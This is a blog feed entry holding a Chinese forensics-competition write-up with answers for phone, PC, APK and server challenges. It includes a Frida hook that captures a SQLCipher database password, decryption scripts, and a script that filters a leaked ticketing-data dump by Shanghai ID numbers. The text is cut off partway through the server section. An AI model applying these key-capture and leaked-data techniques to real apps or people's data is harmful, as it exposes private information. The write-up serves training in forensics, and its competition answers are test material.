<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>w3nx1z1</title>
  
  <subtitle>w3nx1z1 Blog</subtitle>
  <link href="http://w3nx1z1.github.io/atom.xml" rel="self"/>
  
  <link href="http://w3nx1z1.github.io/"/>
  <updated>2024-05-03T14:15:10.417Z</updated>
  <id>http://w3nx1z1.github.io/</id>
  
  <author>
    <name>w3nx1z1</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>第七届精武杯-西柚喵帕斯wp</title>
    <link href="http://w3nx1z1.github.io/2024/05/03/%E7%AC%AC%E4%B8%83%E5%B1%8A%E7%B2%BE%E6%AD%A6%E6%9D%AF-%E8%A5%BF%E6%9F%9A%E7%9A%84%E5%96%B5%E5%B8%95%E6%96%AFWP/"/>
    <id>http://w3nx1z1.github.io/2024/05/03/%E7%AC%AC%E4%B8%83%E5%B1%8A%E7%B2%BE%E6%AD%A6%E6%9D%AF-%E8%A5%BF%E6%9F%9A%E7%9A%84%E5%96%B5%E5%B8%95%E6%96%AFWP/</id>
    <published>2024-05-03T14:14:23.575Z</published>
    <updated>2024-05-03T14:15:10.417Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第七届精武杯-西柚的喵帕斯WP"><a href="#第七届精武杯-西柚的喵帕斯WP" class="headerlink" title="第七届精武杯-西柚的喵帕斯WP"></a>第七届精武杯-西柚的喵帕斯WP</h1><p><strong>计算机&amp;&amp;手机</strong></p><p><strong>1. 请综合分析计算机和手机检材，计算机最近一次登录的账户名是</strong></p><pre><code>admin</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261730494.jpg" alt="img"> </p><p><strong>2.请综合分析计算机和手机检材，计算机最近一次插入的USB存储设备串号是</strong></p><pre><code>S3JKNX0JA05097Y</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261730353.jpg" alt="img"> </p><p><strong>3.请综合分析计算机和手机检材，谢弘的房间号是（）室</strong></p><pre><code>201</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261730356.jpg" alt="img"> </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261730364.jpg" alt="img"> </p><p><strong>4.请综合分析计算机和手机检材，曹锦芳的手机号后四位是</strong></p><pre><code>0683</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404271945444.jpg" alt="img"></p><h3 id="5-请综合分析计算机和手机检材，找到全部4份快递相关的公民信息文档，按姓名-电话-地址去重后共有多少条？"><a href="#5-请综合分析计算机和手机检材，找到全部4份快递相关的公民信息文档，按姓名-电话-地址去重后共有多少条？" class="headerlink" title="5.请综合分析计算机和手机检材，找到全部4份快递相关的公民信息文档，按姓名+电话+地址去重后共有多少条？"></a>5.<strong>请综合分析计算机和手机检材，找到全部4份快递相关的公民信息文档，按姓名+电话+地址去重后共有多少条？</strong></h3><pre><code>4997条</code></pre><p>全部提取出来 其中顺丰2k是伪加密 改一下就可以正常解压 顺丰1k直接修改后缀名为<code>xlsx</code> </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261733131.png" alt="image-20240426173356074"></p><p>使用网钜数据分析 导入4个excel表格</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261735436.png" alt="image-20240426173535343"></p><p>由于没有表头 所以需要再算上第一行 一共是4997条数据</p><p><strong>6.请综合分析计算机和手机检材，统计检材内共有几份购票平台相关的公民信息文档</strong></p><p>3份</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261731735.jpg" alt="img"> </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261731736.jpg" alt="img"> </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404271945290.jpg" alt="img"> </p><p><strong>7.请综合分析计算机和手机检材，樊海锋登记的邮箱账号是</strong></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404271945827.jpg" alt="img"> </p><p><strong>8.请综合分析计算机和手机检材，统计购票平台相关的文档，去重后共有多少条身份证号为上海的公民信息？</strong></p><p>先搜一下身份证为上海的特征</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261731743.jpg" alt="img"> </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261731754.jpg" alt="img"> </p><pre><code class="python">import pandas as pd  # 读取txt文件 data = pd.read_csv(&#39;12306 裤子1.txt&#39;, delimiter=&#39;----&#39;, header=None, engine=&#39;python&#39;)  # 将数据存储到xlsx文件中 data.to_excel(&#39;output.xlsx&#39;, index=False)  # 对第四列进行去重处理 data.drop_duplicates(subset=[3], keep=&#39;first&#39;, inplace=True)  # 筛选出上海公民shanghai_citizens = data[data[3].str.startswith(&#39;31&#39;)]  # 将上海公民的数据存储到一个新的xlsx文件中 shanghai_citizens.to_excel(&#39;shanghai_citizens.xlsx&#39;, index=False) </code></pre><p>跑出来109个</p><p><strong>9.请分析手机检材，2022年11月7日，嫌疑人发送了几条短信？</strong></p><p>3条</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261731916.jpg" alt="img"> </p><p><strong>10.请分析手机检材，其中保存了多少条公民住房信息？</strong></p><p>张三 李四 王武 范宏伟 郭何 章衡 关星 常见 余辉遥 陈剑 吴涵 张智  12个人 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261731003.jpg" alt="img"></p><h2 id="apk功能分析"><a href="#apk功能分析" class="headerlink" title="apk功能分析"></a>apk功能分析</h2><h3 id="1、请分析1-备忘录-apk反编译出的文件中，正确答案在哪个文件里？"><a href="#1、请分析1-备忘录-apk反编译出的文件中，正确答案在哪个文件里？" class="headerlink" title="1、请分析1.备忘录.apk反编译出的文件中，正确答案在哪个文件里？"></a>1、<strong>请分析1.备忘录.apk反编译出的文件中，正确答案在哪个文件里？</strong></h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202405032156946.png" alt="图片"></p><h3 id="2、请分析1-备忘录-apk并找到程序中的主activity是？（答案格式：com-tencent-mm-activity）"><a href="#2、请分析1-备忘录-apk并找到程序中的主activity是？（答案格式：com-tencent-mm-activity）" class="headerlink" title="2、请分析1.备忘录.apk并找到程序中的主activity是？（答案格式：com.tencent.mm.activity）"></a>2、<strong>请分析1.备忘录.apk并找到程序中的主activity是？（答案格式：com.tencent.mm.activity）</strong></h3><pre><code class="Plain">com.hl.memorandum.MainActivity</code></pre><h3 id="3、请分析1-备忘录-apk并找到程序中的flag值（答案格式：HL-66666666-1-1-1-1-）"><a href="#3、请分析1-备忘录-apk并找到程序中的flag值（答案格式：HL-66666666-1-1-1-1-）" class="headerlink" title="3、请分析1.备忘录.apk并找到程序中的flag值（答案格式：HL{66666666-1-1-1-1}）"></a>3、请分析1.备忘录.apk并找到程序中的flag值（答案格式：HL{66666666-1-1-1-1}）</h3><pre><code class="Plain">HL&#123;d0b2058a-ac29-11ed-807f-acde48001122&#125;</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202405032157566.png" alt="图片"></p><h3 id="4、请分析2-easyapk-apk中SharedPreferences配置文件的名称-包括后缀-是什么"><a href="#4、请分析2-easyapk-apk中SharedPreferences配置文件的名称-包括后缀-是什么" class="headerlink" title="4、请分析2.easyapk.apk中SharedPreferences配置文件的名称(包括后缀)是什么?"></a>4、<strong>请分析2.easyapk.apk中SharedPreferences配置文件的名称(包括后缀)是什么?</strong></h3><p>MT管理器查看data&#x2F;data&#x2F;&lt;包名&gt;&#x2F;shared_prefs&#x2F;</p><pre><code class="Plain">myprefs.xml</code></pre><h3 id="5、请分析2-easyapk-apk并找到程序中的flag值（答案格式：HL-66666666-1-1-1-1-）"><a href="#5、请分析2-easyapk-apk并找到程序中的flag值（答案格式：HL-66666666-1-1-1-1-）" class="headerlink" title="5、请分析2.easyapk.apk并找到程序中的flag值（答案格式：HL{66666666-1-1-1-1}）"></a>5、请分析2.easyapk.apk并找到程序中的flag值（答案格式：HL{66666666-1-1-1-1}）</h3><pre><code class="Plain">HL&#123;55c99ed4-d894-ae59-3a3b-6fe3eed793e7&#125;</code></pre><p>看一下发现equal明文比对</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202405032157866.png" alt="图片"></p><p>用frida hook equal函数拦截返回值</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202405032157414.png" alt="图片"></p><p>其实还有一个思路直接去找对应的str1-str5的值</p><h3 id="6、-请分析3-verify-apk，该程序中所使用的AES加密KEY值为"><a href="#6、-请分析3-verify-apk，该程序中所使用的AES加密KEY值为" class="headerlink" title="6、 请分析3.verify.apk，该程序中所使用的AES加密KEY值为"></a>6、 请分析3.verify.apk，该程序中所使用的AES加密KEY值为</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202405032157389.png" alt="图片"></p><h3 id="7、请分析3-verify-apk并找到程序中的flag值（答案格式：HL-66666666-1-1-1-1-）"><a href="#7、请分析3-verify-apk并找到程序中的flag值（答案格式：HL-66666666-1-1-1-1-）" class="headerlink" title="7、请分析3.verify.apk并找到程序中的flag值（答案格式：HL{66666666-1-1-1-1}）"></a>7、请分析3.verify.apk并找到程序中的flag值（答案格式：HL{66666666-1-1-1-1}）</h3><pre><code class="Plain">HL&#123;301b6b90-ac37-11ed-bad4-5811224dd424&#125;</code></pre><p>先用上一题拿到的key解aes</p><pre><code class="Python">from Crypto.Cipher import AESimport base64def decrypt_aes(key, iv, ciphertext):    cipher = AES.new(bytes(key), AES.MODE_CBC, bytes(iv))    plaintext = cipher.decrypt(ciphertext)    return plaintext.rstrip(b&#39;\0&#39;)def main():    # AES key，IV 和 ciphertext（密文）    key = b&#39;thisisyouraeskey&#39;    iv = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16]    ciphertext = base64.b64decode(b&#39;tPbnK29ENaqgPANeD1Hud3KyiS4uf8oaSa0b6ldRDHs=&#39;)    # 解密    decrypted_data = decrypt_aes(key, iv, ciphertext)    print(decrypted_data.decode(&#39;utf-8&#39;))if __name__ == &quot;__main__&quot;:    main()</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202405032158767.png" alt="图片"></p><p>接下来是misc……</p><p>拆包apk后找到一个lookme文件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202405032158212.png" alt="图片"></p><p>winhex打开发现是7z文件头</p><p>改后缀输入密码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202405032158828.png" alt="图片"></p><p>得到lookme.txt，内容为flag</p><h3 id="8、请分析4-easyjni-zip-压缩包中数据库的解密秘钥为"><a href="#8、请分析4-easyjni-zip-压缩包中数据库的解密秘钥为" class="headerlink" title="8、请分析4.easyjni.zip,压缩包中数据库的解密秘钥为"></a>8、请分析4.easyjni.zip,压缩包中数据库的解密秘钥为</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202405032200401.png" alt="图片"></p><p>找到密钥的获取函数<br>编写frida脚本</p><pre><code>setImmediate(function () &#123;   Java.perform(function () &#123;        var SQLiteOpenHelper = Java.use(&quot;net.sqlcipher.database.SQLiteOpenHelper&quot;);//获取类的引用        SQLiteOpenHelper.getWritableDatabase.overload(&#39;java.lang.String&#39;).implementation = function (password) &#123;//拦截getWritableDatabase方法的调用并指定参数类型           console.log(&quot;SQLiteOpenHelper.getWritableDatabase is called: password=&quot; + password);           var result = this.getWritableDatabase(password);           console.log(&quot;SQLiteOpenHelper.getWritableDatabase result=&quot; + result);           return result;        &#125;;    &#125;);&#125;);</code></pre><p>再根据判断条件构造符合要求的un和pw</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202405032159425.png" alt="图片"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202405032201396.png" alt="图片"></p><h3 id="9、请分析4-easyjni-zip并找到程序中的flag值（答案格式：HL-66666666-1-1-1-1-）"><a href="#9、请分析4-easyjni-zip并找到程序中的flag值（答案格式：HL-66666666-1-1-1-1-）" class="headerlink" title="9、请分析4.easyjni.zip并找到程序中的flag值（答案格式：HL{66666666-1-1-1-1}）"></a>9、请分析4.easyjni.zip并找到程序中的flag值（答案格式：HL{66666666-1-1-1-1}）</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202405032159511.png" alt="图片"></p><p>解密数据库拿到加密的账号密码：</p><p>账号密码的加密算法在 so 文件中，分析 so 文件，对字符串的每一位进行了加<br>减 以及位置交换等操作，最后进行了 Base64 换表加密。</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202405032201251.png" alt="图片"></p><pre><code class="python">import base64base64_chars = list(&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&quot;)a = base64_chars[3]base64_chars[3] = base64_chars[6]base64_chars[6] = aa = base64_chars[7]base64_chars[7] = base64_chars[9]base64_chars[9] = aa = base64_chars[20]base64_chars[20] = base64_chars[21]base64_chars[21] = aa = base64_chars[26]base64_chars[26] = base64_chars[1]base64_chars[1] = aa = base64_chars[30]base64_chars[30] = base64_chars[39]base64_chars[39] = aa = base64_chars[2]base64_chars[2] = base64_chars[48]base64_chars[48] = as1 = &quot;&quot;.join(i for i in base64_chars)s2 = &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&#39;data = &quot;MXpjNjRjMzVyYl4zLmACMF8CXi1hMl9jXldbieFIRG91RJFJ&quot;result = list(base64.b64decode(data.translate(str.maketrans(s1, s2)).encode(&#39;utf-8&#39;)))pLen = len(result) - 11for j in range(0, pLen-1, 2): i = result[j] result[j] = result[j+1] result[j+1] = ifor i in range(0, int(pLen/2)): j = result[i] result[i] = result[pLen-1-i] result[pLen-1-i] = jfor i in range(pLen, pLen+11): result[i] = result[i] - 15for i in range(pLen): result[i] = result[i] + 3aa = &quot;&quot;.join(chr(i) for i in result)print(aa[-11:] + aa[:-11])</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202405032208256.png" alt="图片"></p><h3 id="10、请分析5-calc-apk并找到程序中的flag值（答案格式：HL-66666666-1-1-1-1-）"><a href="#10、请分析5-calc-apk并找到程序中的flag值（答案格式：HL-66666666-1-1-1-1-）" class="headerlink" title="10、请分析5.calc.apk并找到程序中的flag值（答案格式：HL{66666666-1-1-1-1}）"></a>10、请分析5.calc.apk并找到程序中的flag值（答案格式：HL{66666666-1-1-1-1}）</h3><p>Java 层只有验证输入是否正确的逻辑，算法都在 so 文件中。</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202405032209364.png" alt="图片"></p><p>可知这里是加密函数：<br>ida 不能 F5，分析得知是没有识别 switch 结构，自定义 switch 结构即可。</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202405032209496.png" alt="图片"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202405032209496.png" alt="图片"></p><pre><code class="c">//反编译后的函数：__int64 sub_E7EC()&#123; __int64 v0; // x9 int i; // [xsp+1Ch] [xbp-24h] unsigned __int8 *v3; // [xsp+20h] [xbp-20h] __int64 v4; // [xsp+28h] [xbp-18h] int v5; // [xsp+30h] [xbp-10h] int v6; // [xsp+34h] [xbp-Ch] int v7; // [xsp+38h] [xbp-8h] v7 = 0; v6 = 0; v5 = 0; v4 = 0LL; v3 = (unsigned __int8 *)sub_EA34(); for ( i = 0; ; ++i ) &#123; if ( i &gt;= 418 ) return 1; if ( (unsigned int)byte_34000[i] - 1 &lt;= 0xDuLL ) break;LABEL_20: ; &#125; switch ( (unsigned int)jpt_E874 ) &#123; case 0u: v4 ^= 0x51uLL; goto LABEL_20; case 1u: dword_341A4[v7] *= 2; goto LABEL_20; case 2u: v6 = *v3; goto LABEL_20; case 4u: v4 += (unsigned int)(v6 * dword_341A4[v7]); //形式类似方程中的 x1 * 12 + x2 * 14 + x3 * 52 ....... goto LABEL_20; case 5u: ++v7; goto LABEL_20; case 6u: ++v3; goto LABEL_20; case 7u: ++v4; goto LABEL_20; case 8u: dword_341A4[v7] += 12; goto LABEL_20; case 9u: --v4; goto LABEL_20; case 0xAu: v0 = v5++; if ( v4 == qword_342A8[v0] ) //比较值 &#123; v4 = 0LL; goto LABEL_20; &#125; return 0; case 0xBu: v3 -= 8; goto LABEL_20; case 0xCu: dword_341A4[v7] ^= 0x20u; goto LABEL_20; case 0xDu: dword_341A4[v7] -= 3; goto LABEL_20; default: goto LABEL_20; &#125;&#125;</code></pre><p>进行简单修改就可以使用 C 跑起来</p><pre><code class="C">#include &lt;stdio.h&gt;int main()&#123; __int64 v0; // x9 int i; // [xsp+1Ch] [xbp-24h] //unsigned __int8 *v3; // [xsp+20h] [xbp-20h] __int64 v4; // [xsp+28h] [xbp-18h] int v5; // [xsp+30h] [xbp-10h] int v6; // [xsp+34h] [xbp-Ch] int v7; // [xsp+38h] [xbp-8h] unsigned char byte_34000[420] = &#123; 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x02, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x09, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x0B, 0x0C, 0x03, 0x02, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x0B, 0x0C, 0x03, 0x05, 0x08, 0x01, 0x01, 0x0A, 0x06, 0x07, 0x03, 0x0E, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x0D, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x0B, 0x0C, 0x03, 0x0D, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x0B, 0x0C, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x02, 0x05, 0x08, 0x0A, 0x06, 0x01, 0x01, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x09, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x0B, 0x0C, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x01, 0x01, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x0B, 0x0C, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x0D, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x0B, 0x0C, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x01, 0x01, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x0E, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x0B, 0x0C, 0x00, 0x00 &#125;;unsigned int dword_341A4[65] = &#123; 0x00000091, 0x00000030, 0x00000038, 0x0000009A, 0x00000036, 0x00000023, 0x0000004A, 0x0000002A, 0x0000002D, 0x00000094, 0x00000024, 0x00000036, 0x00000018, 0x0000002D, 0x00000036, 0x00000020, 0x00000033, 0x00000094, 0x00000038, 0x0000009A, 0x00000162, 0x00000023, 0x000000AE, 0x0000002A, 0x0000000F, 0x00000030, 0x0000004A, 0x0000009A, 0x00000036, 0x00000033, 0x0000004A, 0x0000002A, 0x00000041, 0x00000030, 0x00000038, 0x0000009A, 0x00000036, 0x00000023, 0x0000004A, 0x0000008E, 0x0000005F, 0x00000030, 0x00000038, 0x0000004A, 0x00000036, 0x00000023, 0x0000002C, 0x0000002A, 0x00000091, 0x00000044, 0x00000038, 0x0000000F, 0x00000036, 0x00000023, 0x0000004A, 0x0000002A, 0x00000091, 0x00000030, 0x00000060, 0x0000009A, 0x0000009A, 0x00000023, 0x0000004A, 0x0000002A, 0x00000000&#125;; unsigned long qword_342A8[8] = &#123; 0x000000000000E51E, 0x0000000000009DE7, 0x00000000000137F6, 0x000000000000BEBA, 0x00000000000101A2, 0x00000000000092E8, 0x0000000000009204, 0x000000000000EF22 &#125;; char *v3 = &quot;12345678&quot;; v7 = 0; v6 = 0; v5 = 0; v4 = 0LL; for ( i = 0; i &lt; 418; ++i ) &#123; switch (byte_34000[i]) &#123; case 1u:v4 ^= 0x51uLL; goto LABEL_19; case 2u: dword_341A4[v7] *= 2; goto LABEL_19; case 3u: v6 = *v3; goto LABEL_19; case 5u: v4 += (unsigned int) (v6 * dword_341A4[v7]); ////在这里将值进行输出 printf(&quot;x%c * %d + &quot;, v6, dword_341A4[v7]); goto LABEL_19; case 6u: ++v7; goto LABEL_19; case 7u: ++v3; goto LABEL_19; case 8u: ++v4; goto LABEL_19; case 9u: dword_341A4[v7] += 12; goto LABEL_19; case 0xAu: --v4; goto LABEL_19; case 0xBu: v0 = v5++; printf(&quot;= %d\n&quot;, qword_342A8[v0]); //将最终比较的数据进行输出 break; //return 0; case 0xCu: v3 -= 8; goto LABEL_19; case 0xDu: dword_341A4[v7] ^= 0x20u; goto LABEL_19; case 0xEu: dword_341A4[v7] -= 3; goto LABEL_19; default: goto LABEL_19; LABEL_19: break; &#125; &#125; &#125;&#125;//跑起来后，会输出如下形式，8 元一次方程：x1 * 145 + x2 * 48 + x3 * 112 + x4 * 154 + x5 * 54 + x6 * 47 + x7 * 74 + x8 * 42 = 58654x1 * 90 + x2 * 148 + x3 * 36 + x4 * 54 + x5 * 24 + x6 * 45 + x7 * 54 + x8 * 32 = 40423x1 * 51 + x2 * 145 + x3 * 56 + x4 * 186 + x5 * 354 + x6 * 35 + x7 * 174 + x8 * 42 = 79862x1 * 47 + x2 * 48 + x3 * 74 + x4 * 154 + x5 * 54 + x6 * 51 + x7 * 74 + x8 * 42 = 48826x1 * 65 + x2 * 48 + x3 * 112 + x4 * 154 + x5 * 54 + x6 * 47 + x7 * 74+ x8 * 142 = 65954x1 * 95 + x2 * 48 + x3 * 56 + x4 * 74 + x5 * 54 + x6 * 35 + x7 * 44 +x8 * 42 = 37608x1 * 145 + x2 * 68 + x3 * 56 + x4 * 15 + x5 * 54 + x6 * 35 + x7 * 74 + x8 * 42 = 37380x1 * 145 + x2 * 48 + x3 * 96 + x4 * 154 + x5 * 154 + x6 * 35 + x7 * 74 + x8 * 42 = 61218</code></pre><p>z3直接解</p><pre><code class="python">from z3 import *import hashlibdef hash_md5(data): hash=hashlib.md5() hash.update(bytes(data,encoding=&#39;utf-8&#39;)) return hash.hexdigest()x1 = Int(&#39;x1&#39;)x2 = Int(&#39;x2&#39;)x3 = Int(&#39;x3&#39;)x4 = Int(&#39;x4&#39;)x5 = Int(&#39;x5&#39;)x6 = Int(&#39;x6&#39;)x7 = Int(&#39;x7&#39;)x8 = Int(&#39;x8&#39;)s = Solver()s.add(x1 * 145 + x2 * 48 + x3 * 112 + x4 * 154 + x5 * 54 + x6 * 47 + x7 * 74 + x8 * 42 == 58654)s.add(x1 * 90 + x2 * 148 + x3 * 36 + x4 * 54 + x5 * 24 + x6 * 45 + x7* 54 + x8 * 32 == 40423)s.add(x1 * 51 + x2 * 145 + x3 * 56 + x4 * 186 + x5 * 354 + x6 * 35 + x7 * 174 + x8 * 42 == 79862)s.add(x1 * 47 + x2 * 48 + x3 * 74 + x4 * 154 + x5 * 54 + x6 * 51 + x7* 74 + x8 * 42 == 48826)s.add(x1 * 65 + x2 * 48 + x3 * 112 + x4 * 154 + x5 * 54 + x6 * 47 + x7 * 74 + x8 * 142 == 65954)s.add(x1 * 95 + x2 * 48 + x3 * 56 + x4 * 74 + x5 * 54 + x6 * 35 + x7 * 44 + x8 * 42 == 37608)s.add(x1 * 145 + x2 * 68 + x3 * 56 + x4 * 15 + x5 * 54 + x6 * 35 + x7* 74 + x8 * 42 == 37380)s.add(x1 * 145 + x2 * 48 + x3 * 96 + x4 * 154 + x5 * 154 + x6 * 35 + x7 * 74 + x8 * 42 == 61218)if (s.check() == sat): model = s.model() print(model) flag=&quot;&quot; for i in range(1, 9): if (model[eval(&quot;x&quot; + str(i))] != None): flag += chr(model[eval(&quot;x&quot; + str(i))].as_long().real) else: flag += &quot; &quot; print(&quot;HL&#123;&quot; + hash_md5(flag) + &quot;&#125;&quot;)</code></pre><p>app 的正确输入：AZaz09@}<br>最终答案：HL{96233a87c59bf7f0aa2ed16d9bc2e07a}</p><h2 id="服务器"><a href="#服务器" class="headerlink" title="服务器"></a>服务器</h2><h3 id="1-请对所给服务器检材进行分析，请-写-出-管-理-员-安-装“mdadm-4-1-9-el7-9-x86-64”的时间？（答案格式：18-18-18）"><a href="#1-请对所给服务器检材进行分析，请-写-出-管-理-员-安-装“mdadm-4-1-9-el7-9-x86-64”的时间？（答案格式：18-18-18）" class="headerlink" title="1. 请对所给服务器检材进行分析，请 写 出 管 理 员 安 装“mdadm-4.1-9.el7_9.x86_64”的时间？（答案格式：18:18:18）"></a><strong>1. 请对所给服务器检材进行分析，请 写 出 管 理 员 安 装“mdadm-4.1-9.el7_9.x86_64”的时间？（答案格式：18:18:18）</strong></h3><pre><code>13:13:01</code></pre><p>使用命令搜索</p><p>rpm可以提供包的名称、版本、发布信息、安装日期、大小、构建日期、构建主机、安装后的大小、来源RPM、许可证、URL、摘要和描述等信息。</p><pre><code>rpm -qi mdadm </code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261517242.png" alt="image-20240426151736184"></p><p>Install Data就是安装时间 <code>01:13:01 PM CST</code> 是下午的1点13分1秒 换成24小时制就是<code>13:13:01</code></p><h3 id="2-请对所给服务器检材进行分析，请写出宝塔默认建站的目录是什么？（答案格式：-x2F-abc-x2F-def）"><a href="#2-请对所给服务器检材进行分析，请写出宝塔默认建站的目录是什么？（答案格式：-x2F-abc-x2F-def）" class="headerlink" title="2. 请对所给服务器检材进行分析，请写出宝塔默认建站的目录是什么？（答案格式：&#x2F;abc&#x2F;def）"></a><strong>2. 请对所给服务器检材进行分析，请写出宝塔默认建站的目录是什么？（答案格式：&#x2F;abc&#x2F;def）</strong></h3><pre><code>/data</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404242314026.png" alt="image-20240424231441889"></p><h3 id="3-请对所给服务器检材进行分析，请写出ip为192-168-157-1的机器登陆失败的时间是什么时候？（答案格式：xxxx-xx-xx-xx-xx-xx）"><a href="#3-请对所给服务器检材进行分析，请写出ip为192-168-157-1的机器登陆失败的时间是什么时候？（答案格式：xxxx-xx-xx-xx-xx-xx）" class="headerlink" title="3.请对所给服务器检材进行分析，请写出ip为192.168.157.1的机器登陆失败的时间是什么时候？（答案格式：xxxx-xx-xx xx:xx:xx）"></a>3.请对所给服务器检材进行分析，请写出ip为192.168.157.1的机器登陆失败的时间是什么时候？（答案格式：xxxx-xx-xx xx:xx:xx）</h3><pre><code>2020-10-09 16:47:29</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261525429.png" 